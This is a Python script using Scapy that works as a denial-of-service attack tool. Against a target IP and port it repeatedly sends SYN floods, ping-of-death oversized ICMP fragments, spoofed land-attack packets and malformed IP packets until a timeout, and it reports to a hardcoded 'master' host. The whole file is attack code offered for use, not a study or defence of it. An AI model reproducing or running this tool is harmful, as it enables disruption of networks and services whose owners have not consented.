import os.path
import sys
import socket
import subprocess
import time
import signal
from scapy.all import *
bTimeout=0
pid = os.getpid()
print "Process ID:", pid
def timeOut(s):
	if int(s)<60 and int(s)>0:
		return True
	else:
		return False
def validate_port(x):
	if int(x)>0 and int(x)<65536:
		return True
	else:
		return False
def validate_ip(s):
    a = s.split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True
def packExist(mymodule): 
	try:
		res = subprocess.check_output(["dpkg", "-S",mymodule])
		for line in res.splitlines():
			if "not installed" in line:
				return False
			else:
				return True
	except:
		sys.exit("package not located")
def transmitError(input):
	try:
		client = socket.socket(AF_INET, socket.SOCK_STREAM)
		client.connect(("192.168.0.2"),8800) 
		client.send(str(input))
	except:
		sys.exit("unable to update master.")
def synFlood():
	#print "Sent packet details."
	packet=IP(dst=sys.argv[1],id=1111,ttl=99)/TCP(sport=RandShort(),dport=int(sys.argv[2]),seq=12345,ack=1000,window=64,flags="S")/Raw("transformerstransformerstransformerstransformerstransformerstransformerstransformerstransformerstransformerstransformers")
	#ls(packet)
	#inrvl = 0.01
	#print "Sending Packets in ", inrvl ," second intervals for timeout of ",sys.argv[3]," sec"
	#ans,unans=srloop(packet,inter=inrvl,retry=2,timeout=int(sys.argv[3]))
	send(packet)	
	#print "--Packets' summary---"
	#ans.summary()
	#unans.summary()
	#print "Source port flags in response"
	#ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
#TCP ping
def udpFlood():
	packet=IP(dst=sys.argv[1],id=1111,ttl=99)/TCP(sport=RandShort(),dport=int(sys.argv[2]),seq=12345,ack=1000,window=64,flags="S")/Raw("transformerstransformerstransformerstransformerstransformerstransformerstransformerstransformerstransformerstransformers")
	send(packet)	
def tcpPing():
	#inrvl=0.1
	packet=IP(dst=str(sys.argv[1])+"/30")/TCP()
	send(packet)	
	#answ,unasw=srloop(packet,inter=inrvl,retry=2,timeout=int(sys.argv[3]))
	#answ.summary()
	#unasw.summary()
#UDP ping
def udpPing():
	#inrvl=0.1
	packet=IP(dst=sys.argv[1]+"/30")/UDP()
	send(packet)
    	#answ,unasw=srloop(packet,inter=inrvl,retry=2,timeout=int(sys.argv[3]))
	#answ.summary()
	#unasw.summary()
#ARP ping manual
def arpPing():
	#inrvl=0.2
	timeOut=int(sys.argv[3])
	packet=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=sys.argv[4]+"/24")
	send(packet)
	#ans,unans = srloop(packet,inter=inrvl,retry=2,timeout=timeOut)
	#ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%") )
#Malformed packets
def IcmpFlood():
	packet=fragment(IP(dst=sys.argv[1])/ICMP()/("X"*60000))
	send(packet)
def	malformed():
	vrs=3
	Ihl=2
	packet=IP(dst=sys.argv[1], ihl=Ihl, version=vrs)/ICMP()
	#inrvl=0.2
	#timeOut=sys.argv[3]
	send(packet)
	#answ,unasw=srloop(packet,inter=inrvl,retry=2,timeout=int(sys.argv[3]))
	#answ.summary()
	#unasw.summary()
#Ping of death
def PingofDeath():
	packet=fragment(IP(dst=sys.argv[1])/ICMP()/("X"*60000))
	#inrvl=0.2
	send(packet)
	#answ,unasw=srloop(packet,inter=inrvl,retry=2,timeout=int(sys.argv[3]))
	#answ.summary()
	#unasw.summary()
#Land attack (windows):
def LandAttack():
	target=sys.argv[1]
	dport=int(sys.argv[2])
	packet=IP(src=target,dst=target)/TCP(sport=dport,dport=dport)
	send(packet)
	#inrvl=0.2
	#answ,unasw=srloop(packet,inter=inrvl,retry=2,timeout=int(sys.argv[3]))
	#answ.summary()
	#unasw.summary()
if(len(sys.argv)!=5):
	sys.exit("check input.")
else:
	#print (socket.gethostbyname(socket.gethostname()))
	#try:
  	#	socket.inet_aton(sys.argv[1])
	#except socket.error:
  	#	print "invalid"
	if packExist("python-scapy"):
		print "Installed"
	else:
		print "Installing.."
	if(validate_ip(sys.argv[1])):
		print True
	else:		
		transmitError("invalid ip")
		sys.exit("invalid ip")
	if(validate_port(sys.argv[2])):
		print True
	else:
		sys.exit("invalid port")
	bTimeout=0
	if(timeOut(sys.argv[3])):
		bTimeout = time.time() + int(sys.argv[3]) #seconds timeout
		print True
	else:
		sys.exit("invalid timeout")
	if(int(sys.argv[4])==0):
		while True:
			if(time.time() > bTimeout):
				os.kill(pid, signal.SIGTERM)
			else:
				synFlood()
	elif(int(sys.argv[4])==1):
		while True:
			if(time.time() > bTimeout):
				os.kill(pid, signal.SIGTERM)
			else:
				tcpPing()
	elif(int(sys.argv[4])==2):
		while True:
			if(time.time() > bTimeout):
				os.kill(pid, signal.SIGTERM)
			else:
				udpPing()
	elif(int(sys.argv[4])==3):
		while True:
			if(time.time() > bTimeout):
				os.kill(pid, signal.SIGTERM)
			else:
				arpPing()
	elif(int(sys.argv[4])==4):
		while True:
			if(time.time() > bTimeout):
				os.kill(pid, signal.SIGTERM)
			else:
				malformed()
	elif(int(sys.argv[4])==5):
		while True:
			if(time.time() > bTimeout):
				os.kill(pid, signal.SIGTERM)
			else:
				PingofDeath()
	elif(int(sys.argv[4])==6):
		while True:
			if(time.time() > bTimeout):
				os.kill(pid, signal.SIGTERM)
			else:
				LandAttack()
	else:
		sys.exit("invalid attack type")

